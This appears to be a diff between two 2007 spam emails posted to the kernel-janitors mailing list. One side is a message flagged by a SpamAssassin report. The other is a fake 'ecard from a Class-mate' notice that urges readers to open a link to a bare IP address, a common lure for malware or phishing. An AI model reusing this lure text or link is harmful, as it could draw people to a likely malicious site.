@@ -1,54 +1,37 @@
-From: Bridges Emmanuel <bxe@drhennies.de>
-Date: Tue, 03 Jul 2007 14:27:28 +0000
-Subject: [KJ] Re: Unpaid-604e74.pdf
-Message-Id: <468A5CD0.6020400@drhennies.de>
-MIME-Version: 1
-Content-Type: multipart/mixed; boundary="------------000406010008030605080603"
+From: "PostcardsFrom.Com" <rbyv@verizon.net>
+Date: Wed, 18 Jul 2007 17:32:45 +0000
+Subject: [KJ] You've received an ecard from a Class-mate!
+Message-Id: <002001c7c961$a75366a0$7660bfcd@byish.vvp>
 List-Id: <kernel-janitors.vger.kernel.org>
+MIME-Version: 1.0
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
+Hi. Class-mate has sent you an ecard.
+See your card as often as you wish during the next 15 days.
 
---------------000406010008030605080603
-Content-Type: text/plain; charset=iso-8859-2; format=flowed
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+SEEING YOUR CARD
 
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
+http://76.200.219.2/?3933165b19d3383b4c009e
 
---------------000406010008030605080603
-Content-Type: text/plain; name="SpamAssassinReport.txt"
-Content-Disposition: inline; filename="SpamAssassinReport.txt"
-Content-Transfer-Encoding: 7bit
-MIME-Version: 1.0
-X-Mailer: MIME-tools 5.419 (Entity 5.419)
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
 
-Spam detection software, running on the system "daredevil.linux-foundation.org", has
-identified this incoming email as possible spam.  The original message
-has been attached to this so you can view it (if it isn't spam) or label
-similar future email.  If you have any questions, see
-the administrator of that system for details.
+We hope you enjoy your awesome card.
 
-Content preview:  [...] 
-
-Content analysis details:   (6.8 points, 5.0 required)
-
- pts rule name              description
----- ---------------------- --------------------------------------------------
- 3.8 HELO_DYNAMIC_HCC       Relay HELO'd using suspicious hostname (HCC)
- 3.0 UNRESOLVED_TEMPLATE    Headers contain an unresolved template
- 0.0 BAYES_50               BODY: Bayesian spam probability is 40 to 60%
-                            [score: 0.4204]
-
-
-
---------------000406010008030605080603
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
+Wishing you the best,
+Mail Delivery System,
+PostcardsFrom.Com
 
 _______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
---------------000406010008030605080603--
